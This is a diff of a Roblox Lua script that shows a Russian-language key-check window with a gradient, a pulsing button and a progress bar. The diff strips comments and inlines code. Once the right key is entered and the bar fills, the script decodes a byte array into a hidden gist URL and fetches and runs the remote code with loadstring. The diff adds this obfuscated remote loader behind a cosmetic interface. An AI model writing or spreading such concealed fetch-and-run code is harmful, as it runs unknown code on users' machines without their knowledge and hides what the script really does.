@@ -38,7 +38,6 @@ frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
 
--- Градиент
 local grad = Instance.new("UIGradient", frame)
 grad.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 140, 255)),
@@ -46,7 +45,6 @@ grad.Color = ColorSequence.new{
 }
 grad.Rotation = 45
 
--- Заголовок
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, -20, 0, 40)
 title.Position = UDim2.new(0, 10, 0, 60)
@@ -56,7 +54,6 @@ title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 22
 
--- Поле ввода
 local box = Instance.new("TextBox", frame)
 box.Size = UDim2.new(0.8, 0, 0, 36)
 box.Position = UDim2.new(0.1, 0, 0, 110)
@@ -67,7 +64,6 @@ box.TextColor3 = Color3.fromRGB(50, 50, 50)
 box.BackgroundColor3 = Color3.fromRGB(230, 230, 255)
 Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
 
--- Кнопка проверки
 local button = Instance.new("TextButton", frame)
 button.Size = UDim2.new(0.8, 0, 0, 40)
 button.Position = UDim2.new(0.1, 0, 0, 160)
@@ -78,7 +74,6 @@ button.TextColor3 = Color3.fromRGB(30, 30, 30)
 button.Text = "Проверить"
 Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
 
--- Подсказки
 local feedback = Instance.new("TextLabel", frame)
 feedback.Size = UDim2.new(1, 0, 0, 20)
 feedback.Position = UDim2.new(0, 0, 0, 145)
@@ -88,7 +83,6 @@ feedback.TextColor3 = Color3.new(1, 1, 1)
 feedback.Font = Enum.Font.Gotham
 feedback.TextSize = 18
 
--- Прогресс-бар
 local progressBackground = Instance.new("Frame", frame)
 progressBackground.Size = UDim2.new(0.8, 0, 0, 20)
 progressBackground.Position = UDim2.new(0.1, 0, 0, 260)
@@ -107,35 +101,13 @@ local function tweenIn(instance, duration, targetSize)
 end
 tweenIn(frame, 0.5, UDim2.new(0, 400, 0, 320))
 
--- Пульсация кнопки
 local function pulseButton(btn)
     local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
     TweenService:Create(btn, tweenInfo, {Size = UDim2.new(0.82, 0, 0, 42)}):Play()
 end
 pulseButton(button)
 
--- Проверка ключа
-local function fillProgressBar()
-    local duration = 2
-    local startTime = tick()
-    local conn
-    conn = RunService.RenderStepped:Connect(function()
-        local elapsed = tick() - startTime
-        local pct = math.clamp(elapsed / duration, 0, 1)
-        progressBar.Size = UDim2.new(pct, 0, 1, 0)
-        if pct >= 1 then
-            conn:Disconnect()
-            gui:Destroy()
-            
-            -- Обфусцированный loadstring
-            local u={104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,85,67,84,45,104,117,98,47,53,98,49,49,100,49,48,51,56,54,102,49,98,56,99,101,48,56,102,101,98,56,48,51,56,54,49,101,48,98,55,57,47,114,97,119,47,98,50,57,49,55,98,51,57,56,100,52,98,48,99,99,56,48,102,98,50,97,99,97,55,51,97,51,49,51,55,98,97,52,57,52,101,98,99,102,48,47,103,105,115,116,102,105,108,101,49,46,116,120,116}
-            local s=""
-            for i=1,#u do s=s..string.char(u[i]) end
-            loadstring(game:HttpGet(s))()
-        end
-    end)
-end
-
+-- Проверка ключа и запуск loadstring
 button.MouseButton1Click:Connect(function()
     local input = box.Text:match("^%s*(.-)%s*$")
     if not validKey then
@@ -144,7 +116,26 @@ button.MouseButton1Click:Connect(function()
     elseif input == validKey then
         feedback.Text = "✅ Ключ верный, загружаем..."
         feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
-        fillProgressBar()
+
+        -- Прогресс-бар
+        local duration = 2
+        local startTime = tick()
+        local conn
+        conn = RunService.RenderStepped:Connect(function()
+            local elapsed = tick() - startTime
+            local pct = math.clamp(elapsed / duration, 0, 1)
+            progressBar.Size = UDim2.new(pct, 0, 1, 0)
+            if pct >= 1 then
+                conn:Disconnect()
+                gui:Destroy()
+
+                -- Обфусцированный loadstring
+                local u={104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,85,67,84,45,104,117,98,47,53,98,49,49,100,49,48,51,56,54,102,49,98,56,99,101,48,56,102,101,98,56,48,51,56,54,49,101,48,98,55,57,47,114,97,119,47,98,50,57,49,55,98,51,57,56,100,52,98,48,99,99,56,48,102,98,50,97,99,97,55,51,97,51,49,51,55,98,97,52,57,52,101,98,99,102,48,47,103,105,115,116,102,105,108,101,49,46,116,120,116}
+                local s=""
+                for i=1,#u do s=s..string.char(u[i]) end
+                loadstring(game:HttpGet(s))()
+            end
+        end)
     else
         feedback.Text = "❌ Неверный ключ"
         feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
